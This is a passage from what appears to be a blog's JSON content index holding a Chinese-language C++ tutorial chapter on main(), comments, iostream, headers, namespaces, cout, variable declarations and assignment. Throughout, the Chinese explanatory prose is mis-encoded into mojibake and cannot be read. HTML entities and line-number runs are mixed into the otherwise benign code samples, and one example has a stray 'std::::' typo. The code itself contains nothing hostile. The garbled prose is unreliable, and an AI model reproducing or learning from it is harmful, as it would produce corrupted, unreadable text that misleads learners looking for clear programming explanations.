ï¼Œæˆ‘ä»¬æŒæ¡äº†C++çš„åŸºæœ¬æ•°æ®ç±»å‹åŠå…¶ç”¨æ³•ï¼Œä¸ºåç»­æ›´å¤æ‚çš„æ•°æ®ç»“æ„å’Œç®—æ³•æ‰“ä¸‹äº†åšå®çš„åŸºç¡€ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 2 å¼€å§‹å­¦ä¹ C++","slug":"Cpp_tutorial_Chapter_2","date":"2025-04-26T12:03:35.404Z","updated":"2025-04-26T12:01:13.366Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_2/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_2/","excerpt":"","text":"2.1 è¿›å…¥C++æœ¬èŠ‚å°†å¼•å¯¼ä½ ç¼–å†™ç¬¬ä¸€ä¸ªC++ç¨‹åºï¼Œå¹¶ä»‹ç»ä¸€äº›åŸºæœ¬æ¦‚å¿µã€‚ 2.1.1 main()å‡½æ•°æ¯ä¸ªC++ç¨‹åºéƒ½å¿…é¡»åŒ…å«ä¸€ä¸ªåä¸º main çš„å‡½æ•°ã€‚æ“ä½œç³»ç»Ÿé€šè¿‡è°ƒç”¨ main å‡½æ•°æ¥å¯åŠ¨C++ç¨‹åºã€‚main å‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚ åŸºæœ¬ç»“æ„: 123456int main() &#123; // ç¨‹åºä»£ç  return 0; // è¡¨ç¤ºç¨‹åºæˆåŠŸæ‰§è¡Œ&#125; int main(): è¿™æ˜¯ main å‡½æ•°çš„å‡½æ•°å¤´ã€‚int è¡¨ç¤º main å‡½æ•°æ‰§è¡Œå®Œæ¯•åå°†è¿”å›ä¸€ä¸ªæ•´æ•°å€¼ç»™æ“ä½œç³»ç»Ÿã€‚æ‹¬å· () è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚ &#123; ... &#125;: èŠ±æ‹¬å·æ ‡è®°äº†å‡½æ•°ä½“çš„å¼€å§‹å’Œç»“æŸã€‚å‡½æ•°ä½“åŒ…å«äº†ç¨‹åºè¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆè¯­å¥ï¼‰ã€‚ return 0;: è¿™æ¡è¯­å¥è¡¨ç¤º main å‡½æ•°æ‰§è¡Œå®Œæ¯•ã€‚è¿”å›å€¼ 0 é€šå¸¸è¡¨ç¤ºç¨‹åºæˆåŠŸæ‰§è¡Œã€‚éé›¶è¿”å›å€¼é€šå¸¸è¡¨ç¤ºç¨‹åºé‡åˆ°äº†é”™è¯¯ã€‚ ç¤ºä¾‹: ä¸€ä¸ªæœ€ç®€å•çš„C++ç¨‹åºï¼š 1234int main() &#123; return 0; &#125; è¿™ä¸ªç¨‹åºä»€ä¹ˆä¹Ÿä¸åšï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„ã€å¯ä»¥ç¼–è¯‘å’Œè¿è¡Œçš„C++ç¨‹åºã€‚ 2.1.2 C++æ³¨é‡Šæ³¨é‡Šæ˜¯ç¨‹åºä¸­ç”¨äºè§£é‡Šä»£ç çš„éƒ¨åˆ†ï¼Œå®ƒä»¬ä¼šè¢«ç¼–è¯‘å™¨å¿½ç•¥ï¼Œä¸ä¼šå½±å“ç¨‹åºçš„æ‰§è¡Œã€‚æ³¨é‡Šå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚ C++æ”¯æŒä¸¤ç§ç±»å‹çš„æ³¨é‡Šï¼š å•è¡Œæ³¨é‡Š: ä»¥ // å¼€å§‹ï¼Œç›´åˆ°è¯¥è¡Œç»“æŸã€‚ å¤šè¡Œæ³¨é‡Š: ä»¥ /* å¼€å§‹ï¼Œä»¥ */ ç»“æŸï¼Œå¯ä»¥è·¨è¶Šå¤šè¡Œã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314#include &lt;iostream&gt; // è¿™æ˜¯ä¸€ä¸ªå•è¡Œæ³¨é‡Šï¼Œè§£é‡ŠåŒ…å«å¤´æ–‡ä»¶/* è¿™æ˜¯ä¸€ä¸ªå¤šè¡Œæ³¨é‡Šã€‚ å®ƒå¯ä»¥ç”¨æ¥å†™æ›´é•¿çš„è§£é‡Šã€‚ ä¸‹é¢çš„ main å‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚*/int main() &#123; // ä½¿ç”¨ cout è¾“å‡º &quot;Hello, World!&quot; åˆ°æ§åˆ¶å° std::cout &lt;&lt; &quot;Hello, World!&quot; &lt;&lt; std::endl; // endl ç”¨äºæ¢è¡Œ return 0; // ç¨‹åºæˆåŠŸç»“æŸ&#125; 2.1.3 C++é¢„å¤„ç†å™¨å’Œiostreamæ–‡ä»¶åœ¨ç¼–è¯‘C++ç¨‹åºä¹‹å‰ï¼Œé¢„å¤„ç†å™¨ä¼šé¦–å…ˆå¤„ç†æºä»£ç ã€‚é¢„å¤„ç†å™¨æŒ‡ä»¤ä»¥ # ç¬¦å·å¼€å¤´ã€‚ #include æ˜¯ä¸€ä¸ªå¸¸è§çš„é¢„å¤„ç†å™¨æŒ‡ä»¤ï¼Œå®ƒå‘Šè¯‰é¢„å¤„ç†å™¨å°†å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹åŒ…å«åˆ°å½“å‰æ–‡ä»¶ä¸­ã€‚ iostream æ–‡ä»¶æ˜¯C++æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼ŒåŒ…å«äº†è¿›è¡Œè¾“å…¥ï¼ˆinputï¼‰å’Œè¾“å‡ºï¼ˆoutputï¼‰æ“ä½œæ‰€éœ€çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œè¦ä½¿ç”¨ cout è¿›è¡Œè¾“å‡ºï¼Œå°±éœ€è¦åŒ…å« iostream æ–‡ä»¶ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567#include &lt;iostream&gt; // åŒ…å« iostream æ–‡ä»¶ï¼Œä»¥ä¾¿ä½¿ç”¨ coutint main() &#123; std::cout &lt;&lt; &quot;Hello from iostream!&quot;; return 0;&#125; #include &lt;iostream&gt;: è¿™æ¡æŒ‡ä»¤å‘Šè¯‰é¢„å¤„ç†å™¨æŸ¥æ‰¾åä¸º iostream çš„æ ‡å‡†å¤´æ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹æ’å…¥åˆ°è¯¥æŒ‡ä»¤æ‰€åœ¨çš„ä½ç½®ã€‚ 2.1.4 å¤´æ–‡ä»¶åå¤´æ–‡ä»¶ï¼ˆHeader Filesï¼‰åŒ…å«äº†å‡½æ•°ã€ç±»ã€å¯¹è±¡ç­‰çš„å£°æ˜ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºä¸­ä½¿ç”¨å®ƒä»¬ã€‚C++æ ‡å‡†åº“æä¾›äº†è®¸å¤šå¤´æ–‡ä»¶ã€‚ æ ‡å‡†åº“å¤´æ–‡ä»¶: é€šå¸¸ä½¿ç”¨å°–æ‹¬å· &lt;&gt; æ‹¬èµ·æ¥ï¼Œä¾‹å¦‚ &lt;iostream&gt;, &lt;cmath&gt;, &lt;string&gt;ã€‚ç¼–è¯‘å™¨ä¼šåœ¨æ ‡å‡†åº“çš„åŒ…å«è·¯å¾„ä¸­æŸ¥æ‰¾è¿™äº›æ–‡ä»¶ã€‚ ç”¨æˆ·è‡ªå®šä¹‰å¤´æ–‡ä»¶: é€šå¸¸ä½¿ç”¨åŒå¼•å· &quot;&quot; æ‹¬èµ·æ¥ï¼Œä¾‹å¦‚ &quot;myheader.h&quot;ã€‚ç¼–è¯‘å™¨ä¼šé¦–å…ˆåœ¨å½“å‰æºæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æŸ¥æ‰¾ï¼Œç„¶ååœ¨æ ‡å‡†åŒ…å«è·¯å¾„ä¸­æŸ¥æ‰¾ã€‚ C++98ä¹‹å‰çš„å¤´æ–‡ä»¶: ä»¥å‰çš„C++å¤´æ–‡ä»¶å¯èƒ½å¸¦æœ‰ .h åç¼€ï¼ˆå¦‚ &lt;iostream.h&gt;ï¼‰ã€‚ç°ä»£C++ï¼ˆC++98åŠä»¥åï¼‰æ¨èä½¿ç”¨ä¸å¸¦ .h åç¼€çš„æ ‡å‡†å¤´æ–‡ä»¶ï¼ˆå¦‚ &lt;iostream&gt;ï¼‰ï¼Œè¿™äº›å¤´æ–‡ä»¶çš„å†…å®¹ä½äº std å‘½åç©ºé—´ä¸­ã€‚ ç¤ºä¾‹: 1234567891011121314#include &lt;iostream&gt; // æ ‡å‡†åº“å¤´æ–‡ä»¶#include &lt;cmath&gt; // åŒ…å«æ•°å­¦å‡½æ•°ï¼Œå¦‚ sqrt()#include &quot;myutils.h&quot; // ç”¨æˆ·è‡ªå®šä¹‰å¤´æ–‡ä»¶ (å‡è®¾å­˜åœ¨ myutils.h)int main() &#123; double num = 9.0; double root = std::sqrt(num); // ä½¿ç”¨ cmath ä¸­çš„ sqrt å‡½æ•° std::cout &lt;&lt; &quot;Square root of &quot; &lt;&lt; num &lt;&lt; &quot; is &quot; &lt;&lt; root &lt;&lt; std::endl; // å‡è®¾ myutils.h ä¸­å®šä¹‰äº† printMessage() å‡½æ•° // printMessage(&quot;Using custom header!&quot;); return 0;&#125; 2.1.5 åç§°ç©ºé—´åç§°ç©ºé—´ï¼ˆNamespaceï¼‰æ˜¯C++ä¸­é¿å…å‘½åå†²çªçš„ä¸€ç§æœºåˆ¶ã€‚ä¸åŒçš„åç§°ç©ºé—´å¯ä»¥åŒ…å«åŒåçš„å‡½æ•°ã€ç±»æˆ–å˜é‡ã€‚ æ ‡å‡†C++åº“ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ˆå¦‚ cout, cin, endl, string ç­‰ï¼‰éƒ½å®šä¹‰åœ¨åä¸º std çš„åç§°ç©ºé—´ä¸­ã€‚ è¦ä½¿ç”¨ std åç§°ç©ºé—´ä¸­çš„å…ƒç´ ï¼Œæœ‰å‡ ç§æ–¹æ³•ï¼š ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ ::: åœ¨æ¯ä¸ªå…ƒç´ å‰åŠ ä¸Š std::ã€‚ 1std::cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; std::endl; ä½¿ç”¨ using å£°æ˜: å°†ç‰¹å®šçš„åç§°å¼•å…¥å½“å‰ä½œç”¨åŸŸã€‚ 12345678910#include &lt;iostream&gt;using std::cout; // åªå¼•å…¥ coutusing std::endl; // åªå¼•å…¥ endlint main() &#123; cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; endl; // ä¸éœ€è¦ std:: å‰ç¼€ // std::cin &gt;&gt; variable; // å¦‚æœè¦ç”¨ cinï¼Œä»éœ€ std:: æˆ– using std::cin; return 0;&#125; ä½¿ç”¨ using ç¼–è¯‘æŒ‡ä»¤: å°†æ•´ä¸ªåç§°ç©ºé—´çš„æ‰€æœ‰åç§°å¼•å…¥å½“å‰ä½œç”¨åŸŸã€‚ï¼ˆä¸æ¨èåœ¨å¤´æ–‡ä»¶ä¸­æˆ–å…¨å±€ä½œç”¨åŸŸä¸­ä½¿ç”¨ï¼Œå¯èƒ½å¯¼è‡´å‘½åå†²çªï¼‰ 12345678910#include &lt;iostream&gt;using namespace std; // å¼•å…¥ std ä¸­çš„æ‰€æœ‰åç§°int main() &#123; cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; endl; // ä¸éœ€è¦ std:: å‰ç¼€ int x; cin &gt;&gt; x; // cin ä¹Ÿä¸éœ€è¦ std:: å‰ç¼€ return 0;&#125; æ¨èåšæ³•: åœ¨ .cpp æ–‡ä»¶çš„å‡½æ•°å†…éƒ¨æˆ–è¾ƒå°ä½œç”¨åŸŸå†…ï¼Œå¯ä»¥ä½¿ç”¨ using å£°æ˜æˆ– using namespace std;ã€‚ åœ¨å¤´æ–‡ä»¶ (.h) ä¸­ï¼Œç»å¯¹ä¸è¦ä½¿ç”¨ using namespace std;ï¼Œåº”å§‹ç»ˆä½¿ç”¨ std:: å‰ç¼€ã€‚ åœ¨ç®€å•çš„ç¤ºä¾‹æˆ–å°å‹é¡¹ç›®ä¸­ï¼Œusing namespace std; å¯ä»¥ç®€åŒ–ä»£ç ï¼Œä½†åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼ŒåšæŒä½¿ç”¨ std:::: æˆ– using å£°æ˜æ˜¯æ›´å®‰å…¨çš„åšæ³•ã€‚ 2.1.6 ä½¿ç”¨coutè¿›è¡ŒC++è¾“å‡ºcout æ˜¯ iostream åº“ä¸­é¢„å®šä¹‰çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä»£è¡¨æ ‡å‡†è¾“å‡ºæµï¼Œé€šå¸¸è¿æ¥åˆ°æ§åˆ¶å°ï¼ˆå±å¹•ï¼‰ã€‚ &lt;&lt; è¿ç®—ç¬¦ï¼ˆæ’å…¥è¿ç®—ç¬¦ï¼‰ç”¨äºå°†æ•°æ®å‘é€ç»™ cout å¯¹è±¡ï¼Œä½¿å…¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; // è¾“å‡ºå­—ç¬¦ä¸²å­—é¢é‡ std::cout &lt;&lt; &quot;Welcome to C++!&quot;; // è¾“å‡ºæ¢è¡Œç¬¦ (ä½¿ç”¨ std::endl) std::cout &lt;&lt; std::endl; // è¾“å‡ºæ•°å­— std::cout &lt;&lt; &quot;The year is &quot;; std::cout &lt;&lt; 2024; std::cout &lt;&lt; std::endl; // é“¾å¼è¾“å‡º int age = 30; std::cout &lt;&lt; &quot;My age is: &quot; &lt;&lt; age &lt;&lt; &quot; years old.&quot; &lt;&lt; std::endl; // è¾“å‡ºç‰¹æ®Šå­—ç¬¦ (ä½¿ç”¨è½¬ä¹‰åºåˆ—) std::cout &lt;&lt; &quot;This is a tab:\\t.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a newline:\\n.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a quote: \\&quot; &quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a backslash: \\\\&quot; &lt;&lt; std::endl; return 0;&#125; std::endl: æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ§åˆ¶ç¬¦ï¼ˆmanipulatorï¼‰ï¼Œå®ƒä¼šè¾“å‡ºä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå¹¶åˆ·æ–°è¾“å‡ºç¼“å†²åŒºï¼ˆç¡®ä¿å†…å®¹ç«‹å³æ˜¾ç¤ºï¼‰ã€‚ \\n: æ˜¯ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ï¼Œä»£è¡¨æ¢è¡Œç¬¦ã€‚å®ƒåªè¾“å‡ºæ¢è¡Œï¼Œé€šå¸¸ä¸ä¿è¯ç«‹å³åˆ·æ–°ç¼“å†²åŒºã€‚åœ¨å¤šæ•°æƒ…å†µä¸‹ï¼Œ\\n æ¯” std::endl æ•ˆç‡ç¨é«˜ã€‚ 2.1.7 C++æºä»£ç çš„æ ¼å¼åŒ–C++è¯­è¨€å¯¹ä»£ç æ ¼å¼ï¼ˆå¦‚ç©ºæ ¼ã€ç¼©è¿›ã€æ¢è¡Œï¼‰çš„è¦æ±‚ç›¸å¯¹å®½æ¾ï¼Œä½†è‰¯å¥½çš„æ ¼å¼åŒ–å¯¹äºä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§è‡³å…³é‡è¦ã€‚ åŸºæœ¬è§„åˆ™å’Œå»ºè®®: è¯­å¥åˆ†éš”: C++ä½¿ç”¨åˆ†å· ; æ¥ç»“æŸå¤§å¤šæ•°è¯­å¥ã€‚ ç©ºæ ¼: é€šå¸¸åœ¨è¿ç®—ç¬¦ï¼ˆ=, +, -, *, /, &lt;&lt;, &gt;&gt;, == ç­‰ï¼‰ä¸¤è¾¹æ·»åŠ ç©ºæ ¼ã€‚ åœ¨é€—å· , åé¢æ·»åŠ ç©ºæ ¼ã€‚ åœ¨å‡½æ•°åå’Œåé¢çš„æ‹¬å· () ä¹‹é—´é€šå¸¸ä¸åŠ ç©ºæ ¼ã€‚ ç¼©è¿›: ä½¿ç”¨ä¸€è‡´çš„ç¼©è¿›ï¼ˆé€šå¸¸æ˜¯4ä¸ªç©ºæ ¼æˆ–ä¸€ä¸ªåˆ¶è¡¨ç¬¦ï¼‰æ¥è¡¨ç¤ºä»£ç å—ï¼ˆå¦‚ main å‡½æ•°ä½“ã€å¾ªç¯ä½“ã€æ¡ä»¶è¯­å¥ä½“ï¼‰ã€‚è¿™æå¤§åœ°æé«˜äº†ä»£ç ç»“æ„çš„å¯è¯»æ€§ã€‚ æ¢è¡Œ: é€šå¸¸æ¯è¡Œåªå†™ä¸€æ¡è¯­å¥ã€‚ å¯ä»¥åœ¨åˆé€‚çš„åœ°æ–¹ï¼ˆå¦‚è¿ç®—ç¬¦ä¹‹åã€é€—å·ä¹‹åï¼‰å°†é•¿è¯­å¥åˆ†æˆå¤šè¡Œã€‚ èŠ±æ‹¬å· &#123;&#125;: å¯¹äºä»£ç å—ï¼ˆå¦‚å‡½æ•°ä½“ã€if è¯­å¥å—ç­‰ï¼‰ï¼ŒèŠ±æ‹¬å·çš„æ”¾ç½®é£æ ¼æœ‰å¤šç§ï¼ˆå¦‚ K&amp;R é£æ ¼ã€Allman é£æ ¼ï¼‰ï¼Œé€‰æ‹©ä¸€ç§å¹¶ä¿æŒä¸€è‡´å³å¯ã€‚ ç¤ºä¾‹ (è‰¯å¥½æ ¼å¼): 1234567891011121314151617#include &lt;iostream&gt;int main() &#123; // å·¦èŠ±æ‹¬å·é€šå¸¸ç‹¬å ä¸€è¡Œæˆ–åœ¨è¡Œå°¾ int score = 100; std::cout &lt;&lt; &quot;Initial score: &quot; &lt;&lt; score &lt;&lt; std::endl; if (score &gt; 90) &#123; // ç¼©è¿›è¡¨ç¤º if å—å†…éƒ¨ std::cout &lt;&lt; &quot;Excellent!&quot; &lt;&lt; std::endl; score = score + 5; // åœ¨è¿ç®—ç¬¦ä¸¤è¾¹åŠ ç©ºæ ¼ &#125; // å³èŠ±æ‹¬å·é€šå¸¸ç‹¬å ä¸€è¡Œï¼Œä¸å¯¹åº”å—çš„èµ·å§‹å¯¹é½ std::cout &lt;&lt; &quot;Final score: &quot; &lt;&lt; score &lt;&lt; std::endl; return 0;&#125; ç¤ºä¾‹ (ä¸è‰¯æ ¼å¼ï¼Œä½†è¯­æ³•æ­£ç¡®): 12#include &lt;iostream&gt;int main()&#123;int score=100;std::cout&lt;&lt;&quot;Initial score: &quot;&lt;&lt;score&lt;&lt;std::endl;if(score&gt;90)&#123;std::cout&lt;&lt;&quot;Excellent!&quot;&lt;&lt;std::endl;score=score+5;&#125;std::cout&lt;&lt;&quot;Final score: &quot;&lt;&lt;score&lt;&lt;std::endl;return 0;&#125; è™½ç„¶ç¬¬äºŒä¸ªç¤ºä¾‹ä¹Ÿèƒ½ç¼–è¯‘è¿è¡Œï¼Œä½†æéš¾é˜…è¯»å’Œç†è§£ã€‚éµå¾ªä¸€è‡´çš„ã€æ¸…æ™°çš„æ ¼å¼åŒ–é£æ ¼æ˜¯ä¸“ä¸šç¼–ç¨‹çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚ 2.2 C++è¯­å¥C++ç¨‹åºç”±ä¸€ç³»åˆ—è¯­å¥ç»„æˆã€‚è¯­å¥æ˜¯C++ç¨‹åºçš„åŸºæœ¬æ‰§è¡Œå•å…ƒï¼Œé€šå¸¸ä»¥åˆ†å· ; ç»“å°¾ã€‚æœ¬èŠ‚å°†ä»‹ç»ä¸¤ç§åŸºæœ¬çš„è¯­å¥ï¼šå£°æ˜è¯­å¥å’Œèµ‹å€¼è¯­å¥ï¼Œå¹¶è¿›ä¸€æ­¥æ¢è®¨ cout çš„ç”¨æ³•ã€‚ 2.2.1 å£°æ˜è¯­å¥å’Œå˜é‡å£°æ˜è¯­å¥ (Declaration Statement) ç”¨äºå‘ç¼–è¯‘å™¨å£°æ˜ç¨‹åºä¸­å°†è¦ä½¿ç”¨çš„å˜é‡ (Variable) çš„åç§°å’Œç±»å‹ã€‚ å˜é‡ æ˜¯è®¡ç®—æœºå†…å­˜ä¸­ç”¨äºå­˜å‚¨æ•°æ®çš„ä¸€å—åŒºåŸŸï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªåå­—ï¼ˆæ ‡è¯†ç¬¦ï¼‰ã€‚é€šè¿‡å˜é‡åï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®å’Œä¿®æ”¹å­˜å‚¨åœ¨å†…å­˜ä¸­çš„æ•°æ®ã€‚åœ¨ä½¿ç”¨å˜é‡ä¹‹å‰ï¼Œå¿…é¡»å…ˆå£°æ˜å®ƒã€‚ å£°æ˜å˜é‡çš„è¯­æ³•: 1typeName variableName; typeName: æŒ‡å®šå˜é‡è¦å­˜å‚¨çš„æ•°æ®ç±»å‹ï¼ˆä¾‹å¦‚ int è¡¨ç¤ºæ•´æ•°ï¼Œdouble è¡¨ç¤ºæµ®ç‚¹æ•°ï¼‰ã€‚ variableName: ä½ ä¸ºå˜é‡é€‰æ‹©çš„åç§°ï¼ˆæ ‡è¯†ç¬¦ï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; // å£°æ˜ä¸€ä¸ªåä¸º carrots çš„æ•´å‹å˜é‡ int carrots; // å£°æ˜å¤šä¸ªåŒç±»å‹çš„å˜é‡ int dogs, cats; // å£°æ˜å¹¶åŒæ—¶åˆå§‹åŒ–å˜é‡ (èµ‹åˆå€¼) int fleas = 10; double price = 99.99; // C++11 åˆ—è¡¨åˆå§‹åŒ– (æ›´æ¨è) int hamsters = &#123;5&#125;; int gerbils&#123;8&#125;; // èŠ±æ‹¬å·å¯ä»¥çœç•¥ç­‰å· int rats&#123;&#125;; // åˆå§‹åŒ–ä¸º 0 // ... åç»­å¯ä»¥ä½¿ç”¨è¿™äº›å˜é‡ ... carrots = 25; // èµ‹å€¼ std::cout &lt;&lt; &quot;I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Fleas: &quot; &lt;&lt; fleas &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Hamsters: &quot; &lt;&lt; hamsters &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Rats: &quot; &lt;&lt; rats &lt;&lt; std::endl; return 0;&#125; å£°æ˜ (Declaration): å‘Šè¯‰ç¼–è¯‘å™¨å˜é‡çš„åç§°å’Œç±»å‹ã€‚ å®šä¹‰ (Definition): å£°æ˜é€šå¸¸ä¹Ÿæ˜¯å®šä¹‰ï¼Œå› ä¸ºå®ƒä¼šä¸ºå˜é‡åˆ†é…å†…å­˜ç©ºé—´ã€‚ åˆå§‹åŒ– (Initialization): åœ¨å£°æ˜å˜é‡çš„åŒæ—¶ç»™å®ƒèµ‹ä¸€ä¸ªåˆå§‹å€¼ã€‚è¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥é¿å…ä½¿ç”¨æœªå®šä¹‰çš„å€¼ã€‚ 2.2.2 èµ‹å€¼è¯­å¥èµ‹å€¼è¯­å¥ (Assignment Statement) ç”¨äºå°†ä¸€ä¸ªå€¼èµ‹ç»™ä¸€ä¸ªå˜é‡ã€‚å®ƒä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ =ã€‚ è¯­æ³•: 1variableName = value; variableName: è¦æ¥æ”¶å€¼çš„å˜é‡çš„åç§°ï¼ˆå¿…é¡»æ˜¯å·²å£°æ˜çš„å˜é‡ï¼‰ã€‚ value: è¦èµ‹ç»™å˜é‡çš„å€¼ã€‚è¿™å¯ä»¥æ˜¯ä¸€ä¸ªå­—é¢å¸¸é‡ï¼ˆå¦‚ 25ï¼‰ã€å¦ä¸€ä¸ªå˜é‡ã€æˆ–ä¸€ä¸ªè¡¨è¾¾å¼çš„ç»“æœã€‚ é‡è¦æ¦‚å¿µ: èµ‹å€¼æ“ä½œæ˜¯å°†å³ä¾§çš„å€¼å¤åˆ¶åˆ°å·¦ä¾§çš„å˜é‡ä¸­ã€‚ å·¦ä¾§å¿…é¡»æ˜¯ä¸€ä¸ªå¯ä¿®æ”¹çš„**å·¦å€¼ (lvalue)**ï¼Œé€šå¸¸å°±æ˜¯ä¸€ä¸ªå˜é‡åã€‚ å³ä¾§å¯ä»¥æ˜¯ä¸€ä¸ª**å³å€¼ (rvalue)**ï¼Œå³ä¸€ä¸ªå¯ä»¥äº§ç”Ÿå€¼çš„è¡¨è¾¾å¼ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; int carrots; // å£°æ˜å˜é‡ carrots = 25; // èµ‹å€¼è¯­å¥ï¼šå°† 25 èµ‹ç»™ carrots std::cout &lt;&lt; &quot;Now I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; carrots = carrots - 1; // èµ‹å€¼è¯­å¥ï¼šå°†è¡¨è¾¾å¼ carrots - 1 çš„ç»“æœ (24) èµ‹ç»™ carrots std::cout &lt;&lt; &quot;Crunch, crunch. Now I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; int dogs = 5; // å£°æ˜å¹¶åˆå§‹åŒ– int cats; // å£°æ˜ cats = dogs; // èµ‹å€¼è¯­å¥ï¼šå°† dogs çš„å€¼ (5) èµ‹ç»™ cats std::cout &lt;&lt; &quot;Dogs: &quot; &lt;&lt; dogs &lt;&lt; &quot;, Cats: &quot; &lt;&lt; cats &lt;&lt; std::endl; // å¯ä»¥é“¾å¼èµ‹å€¼ (ä»å³å‘å·¦æ‰§è¡Œ) int a, b, c; a = b = c = 10; // c=10, ç„¶å b=c (å³ b=10), ç„¶å a=b (å³ a=10) std::cout &lt;&lt; &quot;a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; return 0;&#125; 2.2.3 coutçš„æ–°èŠ±æ ·æˆ‘ä»¬åœ¨ 2.1.6 èŠ‚å·²ç»å­¦ä¹ äº†å¦‚ä½•ä½¿ç”¨ cout è¾“å‡ºå­—ç¬¦ä¸²å’Œä½¿ç”¨ endl æ¢è¡Œã€‚cout çš„ä¸€ä¸ªå¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒçš„â€œæ™ºèƒ½â€ï¼Œå®ƒå¯ä»¥è¯†åˆ«å¹¶æ­£ç¡®æ˜¾ç¤ºå¤šç§ä¸åŒç±»å‹çš„æ•°æ®ã€‚ cout å¯¹è±¡ä¸æ’å…¥è¿ç®—ç¬¦ &lt;&lt; ç»“åˆä½¿ç”¨ï¼Œå¯ä»¥è‡ªåŠ¨å¤„ç† C++ çš„å†…ç½®æ•°æ®ç±»å‹ï¼Œå¦‚æ•´æ•° (int)ã€æµ®ç‚¹æ•° (double, float)ã€å­—ç¬¦ (char) ä»¥åŠ C é£æ ¼å­—ç¬¦ä¸²å’Œ std::string å¯¹è±¡ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;string&gt; // åŒ…å« string ç±»int main() &#123; int age = 30; double weight = 65.5; char initial = &#x27;J&#x27;; std::string name = &quot;Alice&quot;; // C++ string å¯¹è±¡ const char* city = &quot;New York&quot;; // C é£æ ¼å­—ç¬¦ä¸² // cout å¯ä»¥è‡ªåŠ¨å¤„ç†ä¸åŒç±»å‹ std::cout &lt;&lt; &quot;--- Personal Information ---&quot; &lt;&lt; std::endl; // è¾“å‡ºæ•´æ•° std::cout &lt;&lt; &quot;Age: &quot;; // è¾“å‡ºæç¤ºä¿¡æ¯ std::cout &lt;&lt; age; // è¾“å‡º age å˜é‡çš„å€¼ (æ•´æ•°) std::cout &lt;&lt; std::endl; // æ¢è¡Œ // è¾“å‡ºæµ®ç‚¹æ•° std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; &quot; kg&quot; &lt;&lt; std::endl; // é“¾å¼è¾“å‡º // è¾“å‡ºå­—ç¬¦ std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; // è¾“å‡º C++ string å¯¹è±¡ std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; // è¾“å‡º C é£æ ¼å­—ç¬¦ä¸² std::cout &lt;&lt; &quot;City: &quot; &lt;&lt; city &lt;&lt; std::endl; // æ··åˆè¾“å‡º std::cout &lt;&lt; name &lt;&lt; &quot; is &quot; &lt;&lt; age &lt;&lt; &quot; years old and lives in &quot; &lt;&lt; city &lt;&lt; &quot;.&quot; &lt;&lt; std::endl; // è¾“å‡ºè¡¨è¾¾å¼ç»“æœ std::cout &lt;&lt; &quot;Next year, &quot; &lt;&lt; name &lt;&lt; &quot; will be &quot; &lt;&lt; age + 1 &lt;&lt; &quot; years old.&quot; &lt;&lt; std::endl; return 0;&#125; cout ä¹‹æ‰€ä»¥èƒ½åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ˜¯å› ä¸º &lt;&lt; 